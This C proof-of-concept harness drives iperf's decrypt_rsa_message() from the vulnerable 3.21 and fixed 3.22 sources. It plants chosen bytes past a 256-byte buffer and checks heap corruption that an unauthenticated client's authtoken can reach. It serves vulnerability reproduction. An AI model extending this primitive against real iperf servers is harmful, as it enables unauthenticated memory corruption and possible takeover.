/*
 * iperf2shell harness driver — calls the REAL, pinned decrypt_rsa_message()
 * compiled verbatim from esnet/iperf tag 3.21 (vulnerable) or 3.22 (fixed).
 *
 * No reimplementation: src/iperf_auth.c.3.21 / .3.22 are byte-for-byte the
 * upstream files (hashes in PROVENANCE.md). This driver only:
 *   1. generates a real RSA-2048 key (RSA_size == 256),
 *   2. builds an oversized "decoded authtoken" buffer with chosen bytes,
 *   3. calls decrypt_rsa_message() with the attacker-controlled length,
 *   4. reports deterministic state (chosen bytes that landed out of bounds).
 *
 * The server reaches this with an unauthenticated client's JSON "authtoken":
 *   iperf_api.c:2654-2655 (parse) -> :2318-2321 (decode_auth_setting)
 *   -> iperf_auth.c:392-400 (Base64Decode) -> decrypt_rsa_message().
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/core_names.h>
#include "iperf_auth.h"

/* decrypt_rsa_message is internal to iperf_auth.c (not in iperf_auth.h). */
extern int decrypt_rsa_message(const unsigned char *encryptedtext,
                               const int encryptedtext_len,
                               EVP_PKEY *private_key,
                               unsigned char **plaintext,
                               int use_pkcs1_padding);

static EVP_PKEY *gen_rsa2048(void)
{
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
    EVP_PKEY *key = NULL;
    if (!ctx) return NULL;
    if (EVP_PKEY_keygen_init(ctx) <= 0) { EVP_PKEY_CTX_free(ctx); return NULL; }
    if (EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, 2048) <= 0) { EVP_PKEY_CTX_free(ctx); return NULL; }
    if (EVP_PKEY_keygen(ctx, &key) <= 0) { EVP_PKEY_CTX_free(ctx); return NULL; }
    EVP_PKEY_CTX_free(ctx);
    return key;
}

int main(int argc, char **argv)
{
    int over = (argc > 1) ? atoi(argv[1]) : 80;
    const char *label = (argc > 2) ? argv[2] : "vuln";

    EVP_PKEY *key = gen_rsa2048();
    if (!key) { fprintf(stderr, "keygen failed\n"); return 2; }

    int modulus = 0;
    if (!EVP_PKEY_get_int_param(key, OSSL_PKEY_PARAM_MAX_SIZE, &modulus)) {
        fprintf(stderr, "modulus query failed\n"); return 2;
    }
    if (modulus != 256) { fprintf(stderr, "unexpected modulus %d\n", modulus); return 2; }

    int len = modulus + over;          /* attacker-controlled decoded len */
    unsigned char *enc = (unsigned char *)malloc((size_t)len);
    if (!enc) return 2;
    memset(enc, 0x41, (size_t)len);

    /* Chosen bytes placed at chosen offsets beyond the 256-byte allocation. */
    static const unsigned char mark[16] = {
        'I','P','E','R','F','2','S','H','E','L','L','!',0xde,0xad,0xbe,0xef
    };
    uint64_t chosen_fn = 0x1122334455667788ULL;
    memcpy(enc + modulus + 8, mark, sizeof(mark));       /* chosen marker @ +8  */
    memcpy(enc + modulus + 48, &chosen_fn, 8);           /* chosen value  @ +48 */

    /* Report the chosen bytes BEFORE the call: under ASan the process stops
       at the faulting BIO_read, so post-call lines would never be emitted. */
    printf("label=%s declared_modulus=%d decoded_len=%d oob_bytes=%d\n",
           label, modulus, len, over);
    printf("first_oob=0x%02x at_offset=%d\n", enc[modulus], modulus);
    printf("chosen_marker=%02x%02x%02x%02x chosen_fn=0x%016llx\n",
           mark[0], mark[1], mark[2], mark[3], (unsigned long long)chosen_fn);
    fflush(stdout);

    unsigned char *plaintext = NULL;
    int rc = decrypt_rsa_message(enc, len, key, &plaintext, 0);
    printf("result rc=%d\n", rc);

    /* Rung 2: under the plain (non-ASan) build the adjacent OPENSSL_malloc
       for *plaintext is overwritten by the OOB run. glibc aborts at the
       corrupted chunk metadata before this readback; the fixed build shows
       the clean plaintext_null=1 control. */

    if (plaintext) {
        int found_mark = -1, found_fn = -1;
        for (int i = 0; i < 768 - 16; i++) {
            if (found_mark < 0 && memcmp(plaintext + i, mark, sizeof(mark)) == 0)
                found_mark = i;
            if (found_fn < 0 && memcmp(plaintext + i, &chosen_fn, 8) == 0)
                found_fn = i;
        }
        printf("adjacent_readback marker_at=%d fn_at=%d marker_bytes=%02x%02x%02x%02x fn_bytes=0x%016llx\n",
               found_mark, found_fn,
               found_mark >= 0 ? plaintext[found_mark] : 0,
               found_mark >= 0 ? plaintext[found_mark+1] : 0,
               found_mark >= 0 ? plaintext[found_mark+2] : 0,
               found_mark >= 0 ? plaintext[found_mark+3] : 0,
               found_fn >= 0 ? *(unsigned long long *)(plaintext + found_fn) : 0ULL);
    } else {
        printf("adjacent_readback plaintext_null=1\n");
    }

    EVP_PKEY_free(key);
    free(enc);
    return 0;
}
